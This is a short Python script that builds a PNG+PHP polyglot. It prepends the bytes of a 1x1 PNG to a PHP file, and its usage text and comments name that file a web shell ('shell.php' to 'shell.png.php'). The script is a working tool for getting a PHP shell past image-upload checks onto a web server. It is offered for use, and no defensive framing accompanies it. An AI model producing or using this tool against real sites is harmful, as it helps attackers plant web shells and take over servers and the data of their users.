#!/usr/bin/env python3
import sys
from pathlib import Path

# 1×1 red‑pixel PNG hex (69 bytes)
PNG_HEX = (
    "89504E470D0A1A0A"
    "0000000D494844520000000100000001"
    "0802000000907753DE"
    "0000000C4944415408D763F8CFC0000003"
    "01010018DD8DB0"
    "0000000049454E44AE426082"
)

def graft_png(input_php: Path, output_file: Path):
    # Read the original PHP shell
    php_bytes = input_php.read_bytes()

    # Convert hex to raw PNG bytes
    png_bytes = bytes.fromhex(PNG_HEX)

    # Write PNG header + PHP code
    with open(output_file, "wb") as f:
        f.write(png_bytes)
        f.write(php_bytes)

    print(f"Wrote polyglot PNG+PHP to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} shell.php shell.png.php")
        sys.exit(1)

    in_php, out_file = Path(sys.argv[1]), Path(sys.argv[2])
    graft_png(in_php, out_file)
